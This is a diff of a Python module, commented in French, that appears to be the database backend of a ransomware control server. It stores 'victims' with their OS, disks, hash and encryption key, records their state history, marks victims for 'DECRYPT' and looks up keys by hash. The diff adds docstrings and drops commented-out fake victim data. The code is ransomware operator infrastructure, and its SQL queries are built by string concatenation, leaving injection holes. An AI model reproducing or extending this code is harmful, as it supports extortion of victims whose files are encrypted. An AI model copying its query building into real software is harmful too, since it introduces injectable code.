@@ -9,6 +9,11 @@ DEBUG_MODE = False
 
 
 def connect_db():
+    """
+    Cette fonction établit une connexion à la base de données SQLite en utilisant
+    le nom de fichier défini dans DB_FILENAME. Si la connexion est réussie,
+    elle renvoie l'objet de connexion.
+    """
     sqlite_connection = None
     try:
         sqlite_connection = sqlite3.connect(DB_FILENAME)
@@ -20,6 +25,13 @@ def connect_db():
 
 
 def insert_data(conn, table, items, data):
+    """
+    Cette fonction insère des données dans la table spécifiée de la base de données.
+    Les paramètres conn, table, items et data sont utilisés pour construire la
+    requête d'insertion. Si DEBUG_MODE est activé, la requête est affichée avant
+    l'exécution. Après l'insertion, la fonction effectue un commit pour
+    sauvegarder les modifications.
+    """
     insert_query = "INSERT INTO " + table + " " + items + " VALUES " + data
     if DEBUG_MODE:
         print(insert_query)
@@ -36,6 +48,12 @@ def insert_data(conn, table, items, data):
 
 
 def select_data(conn, select_query):
+    """
+    Cette fonction exécute une requête de sélection sur la base de données en
+    utilisant la requête spécifiée. Si DEBUG_MODE est activé, la requête est
+    affichée avant l'exécution.
+    Les résultats de la requête sont renvoyés sous forme de liste de tuples.
+    """
     if DEBUG_MODE:
         print(select_query)
 
@@ -52,6 +70,10 @@ def select_data(conn, select_query):
 
 
 def select_data_script(conn, select_query):
+    """
+    Cette fonction est similaire à select_data(), mais elle est utilisée lorsque
+    la requête spécifiée est un script SQL plutôt qu'une simple requête de sélection.
+    """
     if DEBUG_MODE:
         print(select_query)
 
@@ -68,6 +90,11 @@ def select_data_script(conn, select_query):
 
         
 def list_victims(conn):
+    """
+    Cette fonction récupère une liste de toutes les victimes à partir de la base
+    de données. La requête SQL utilise une sous-requête pour obtenir l'état le
+    plus récent de chaque victime.
+    """
     # victims contient la liste de toutes les victimes (id_victim, hash, os, disks, state)
     query = '''
     SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
@@ -153,6 +180,9 @@ def insert_victim_new(conn, hash_victim, os_victim, disk_victim, key_victim):
 
 
 def history_req(conn, id_victim):
+    """
+    Cette fonction récupère l'historique des états pour une victime spécifiée par son ID.
+    """
     # histories contient la liste de tous les historiques d'état (id_victim, datetime, state)
     query = f'''
         SELECT states.id_victim, states.datetime, states.state
@@ -200,32 +230,19 @@ def history_req(conn, id_victim):
 
 
 def change_state(conn, id_victim):
+    """
+    Cette fonction insère un nouvel état "DECRYPT" pour la victime spécifiée par son ID dans la table "states".
+    """
     insert_data(conn, 'states', '(id_victim, datetime, state)', f"({id_victim}, {int(time.time())}, 'DECRYPT')")
     return f'State for id:{id_victim} has been changed.'
 
-'''
-# insert fake victims data
-for victim in fake_victims:
-    c.execute('INSERT INTO victims VALUES (?, ?, ?, ?,?)', [victim[0],victim[2],victim[1],victim[3],None])
-'''
-'''
-# insert fake history data
-for i, history in enumerate(fake_histories):
-    victim_id = i % len(fake_victims) + 1  # ensure each history row is linked to a different victim
-    c.execute('INSERT INTO states VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[1]])
-    c.execute('INSERT INTO encrypted VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[2]])
-'''
-# commit the changes and close the connection
-
-'''
-lv = list_victim()
-for ent in lv:
-    msg_builder = message.list_victim_resp(ent[0], ent[1], ent[3], ent[2], ent[4])
-    print(msg_builder)
-print(message.list_victim_end())
-'''
 
 def check_hash(conn, hash_v):
+    """
+    Cette fonction vérifie si un hachage de victime existe dans la base de données.
+    Si le hachage est trouvé, elle récupère l'ID de la victime, sa clé et son
+    dernier état à partir des tables correspondantes.
+    """
     rq = f'''
     SELECT victims.id_victim, victims.key
     FROM victims
